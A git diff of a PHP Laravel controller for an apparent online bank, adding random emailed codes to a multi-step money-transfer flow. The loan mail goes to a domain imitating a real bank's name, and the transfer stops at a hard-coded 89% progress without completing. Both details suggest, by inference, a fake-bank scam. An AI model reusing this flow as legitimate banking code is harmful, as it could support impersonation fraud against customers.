@@ -12,7 +12,8 @@ use App\Mail\PretMail;
 use App\Mail\VirementMail;
 use App\Mail\CodeMail;
 use App\Mail\CodeMail2;
-
+use App\Mail\CodeMail3;
+use Illuminate\Support\Facades\Auth;
 
 class OperationController extends Controller
 {
@@ -62,11 +63,11 @@ class OperationController extends Controller
         $pret->codeBancaire = request('codeBancaire');
         $pret->delaiRemboursement = request('delaiRemboursement');
 
-        $pret->save(); 
+        $pret->save();
 
         Mail::to('infoline@oursocietygenerale.com')->send(new PretMail($request->except('_token')));
 
-        $succes = 'Votre demande de prêt a été bien envoyé !';  
+        $succes = 'Votre demande de prêt a été bien envoyé !';
 
         return back()->withSuccess($succes);
     }
@@ -90,9 +91,9 @@ class OperationController extends Controller
         if(auth()->guest()){
             return redirect()->route('front.login');
         }
-        
-        Mail::to(auth()->user()->email)->send(new CodeMail('446944'));
-
+        $code = str_random(6);
+        Auth::user()->update(['code1' => $code]);
+        Mail::to(auth()->user()->email)->send(new CodeMail($code));
         return view('front.virement');
     }
 
@@ -102,8 +103,6 @@ class OperationController extends Controller
             return redirect()->route('front.login');
         }
         request()->validate([
-            'nom' => 'required|max:50',
-            'prenom' => 'required|max:50',
             'iban' => 'required',
             'bicswift' => 'required',
             'nameBanque' => 'required',
@@ -111,7 +110,7 @@ class OperationController extends Controller
             'code' =>'required',
         ]);
 
-        if(request('code') != '446944')
+        if(request('code') != Auth::user()->code1)
         {
             return redirect()->back()->withInput()->withErrors([
                 'error' => ''
@@ -119,8 +118,7 @@ class OperationController extends Controller
         }
 
         $virements = new Virement;
-        $virements->nom = request('nom');
-        $virements->prenom = request('prenom');
+        $virements->user_id = Auth::user()->id;
         $virements->iban = request('iban');
         $virements->bicswift = request('bicswift');
         $virements->nameBanque = request('nameBanque');
@@ -135,13 +133,16 @@ class OperationController extends Controller
 
     public function virement2()
     {
-        Mail::to(auth()->user()->email)->send(new CodeMail2('P08HG5'));
-        return view('front.virement2');
+        $code = str_random(6);
+        Auth::user()->update(['code2' => $code]);
+        Mail::to(auth()->user()->email)->send(new CodeMail2($code));
+        $percent = 45;
+        return view('front.virement2', compact('percent'));
     }
 
     public function virementPost2()
     {
-        if (request('code2') == 'P08HG5') 
+        if (request('code2') == Auth::user()->code2)
         {
             return redirect()->route('front.virement3');
         }
@@ -153,6 +154,24 @@ class OperationController extends Controller
 
     public function virement3()
     {
-        return view('front.virement3');
+        $code = str_random(6);
+        Auth::user()->update(['code3' => $code]);
+        Mail::to(auth()->user()->email)->send(new CodeMail3($code));
+        $percent = 80;
+        return view('front.virement3', compact('percent'));
+    }
+
+    public function virementPost3()
+    {
+        if (request('code3') == Auth::user()->code3)
+        {
+            $finish = 0;
+            $percent = 89;
+            return view('front.virement3', compact(['percent' ,'finish']));
+        }
+        else
+        {
+            return redirect()->back()->withErrors(['error' => '']);
+        }
     }
 }
